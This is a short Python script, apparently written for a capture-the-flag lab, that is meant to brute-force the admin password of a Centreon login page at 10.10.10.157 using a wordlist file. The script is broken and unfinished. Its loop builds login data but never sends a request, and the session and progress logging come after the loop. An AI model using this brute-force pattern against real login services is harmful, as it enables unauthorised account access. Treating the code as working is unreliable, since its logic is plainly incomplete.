#!/usr/bin/python3

from pwn import *

import requests, sys, re, signal, pdb, time, sys

def def_handler(sig, frame):
    print("\n\n[!] Saliendo \n")
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)

login_url = "http://10.10.10.157/centreon/index.php"


def makeResquest():
    
    f = open("prueba.txt", "r")
    
    for prueba in f.readlines():
        prueba = prueba.strip()
        
        post_data = {
            'useralias':'admin',
            'password': '%s' % prueba,
            'submitLogin': 'Connect',
            'token': 'token',       
        }
    
    
    s = requests.session()
    
    progress = logging.progress("Iniciando Fuerza Bruta")
    progress.status("Iniciando...")
        
            
    
    
if __name__ == "__main__":
    makeResquest()    